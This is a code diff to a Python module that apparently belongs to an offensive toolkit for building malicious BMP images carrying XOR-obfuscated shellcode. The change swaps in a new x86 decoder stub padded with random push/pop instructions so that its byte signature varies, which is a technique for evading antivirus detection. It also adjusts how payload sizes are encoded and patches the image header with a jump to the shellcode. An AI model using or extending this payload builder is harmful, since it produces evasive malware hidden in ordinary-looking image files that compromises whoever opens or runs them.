@@ -13,11 +13,17 @@ class GenModule(ModuleObject):
         self.vars["shellcode"] = ["", "Shellcode payload using \\x41\\x41 format"]
         self.vars["source"] = ["sample/default.bmp", "Image source file path"]
         self.vars["output"] = ["output/output-%d.bmp" % time.time(), "Output file path"]
+        self.vars["debug"] = ["false", "Show debug output. More verbose"]
         self.description = "Module to generate malicious Bitmap image with embedded obfuscation shellcode"
         self.module_name = "generate"
         self.image = {}
-        self.decoder = "\xeb\x2b\x58\x31\xc9\x89\xcb\x6a\x04\x5a\x43\xff\x30\x59\x0f\xc9\x31\xd9\x81\xf9[MAGIC]\x75\xf0\x0f\xcb\x31\xc9\x80\xc1[CL]\x01\xd0\x31\x18\xe2\xfa\x66\x2d[CX]\xff\xe0\xe8\xd0\xff\xff\xff"
-        
+        self.decoder = "\xeb\x44\x58\x68[RAND1]\x31\xc9\x89\xcb\x6a\x04\x5a\x68[RAND2]\xff\x30\x59\x0f\xc9\x43\x31\xd9\x81\xf9[MAGIC]\x68[RAND3]\x75\xef\x0f\xcb\xb9[SIZE/4]\x01\xd0\x31\x18\x68[RAND4]\xe2\xf4\x2d[SIZE]\xff\xe0\xe8\xb7\xff\xff\xff"
+    
+    def is_debug(self):
+        if self.vars["debug"][0].lower() == "true":
+            return True
+        return False
+    
     def run_action(self):
         data = self.get_file_data()
         if data:
@@ -67,7 +73,11 @@ class GenModule(ModuleObject):
             shellcode = self.xor_payload(shellcode, key)
             size = len(shellcode)
             shellcode = self.set_decoder(hex(magic)[2:].decode("hex"), (size - 4)) + shellcode
+            for i in range(1, 5):
+                shellcode = shellcode.replace("[RAND" + str(i) + "]", self.gen_pop(hex(self.gen_magic())[2:].decode("hex")))
             self.ui.print_msg("Final shellcode length is %s (%d) bytes" % (hex(len(shellcode)), len(shellcode)))
+            if self.is_debug():
+                print
             return shellcode
         except:
             self.ui.print_error("Something when wrong during the obfuscation. Wrong shellcode format?")
@@ -108,9 +118,13 @@ class GenModule(ModuleObject):
         return final
 
     def set_decoder(self, magic, size):
-        cl = ("0" * (2 - len(hex(size / 4)[2:])) + hex(size / 4)[2:]).decode("hex")[::-1]
-        cx = ("0" * (4 - len(hex(size - 4)[2:])) + hex(size - 4)[2:]).decode("hex")[::-1]
-        return self.decoder.replace("[MAGIC]", magic[::-1]).replace("[CL]", cl).replace("[CX]", cx)
+        size4 = ("0" * (8 - len(hex(size / 4)[2:])) + hex(size / 4)[2:]).decode("hex")[::-1]
+        size = ("0" * (8 - len(hex(size - 4)[2:])) + hex(size - 4)[2:]).decode("hex")[::-1]
+        return self.decoder.replace("[MAGIC]", magic[::-1]).replace("[SIZE/4]", size4).replace("[SIZE]", size)
+    
+    def gen_pop(self, data):
+        pops = ["\x5f", "\x5e"]
+        return data + pops[random.randint(0, len(pops) - 1)]
     
     def edit_bmp_header(self, size, shellcode_size):
         jmp = hex(size - shellcode_size - 7)[2:]
@@ -134,5 +148,4 @@ class GenModule(ModuleObject):
             open(path, "wb").write(data)
             self.ui.print_msg("Successfully save the image. (%s)" % path)
         except:
-            self.ui.print_error("Failed to save the image. (%s)" % path)
-           
+            self.ui.print_error("Failed to save the image. (%s)" % path)       
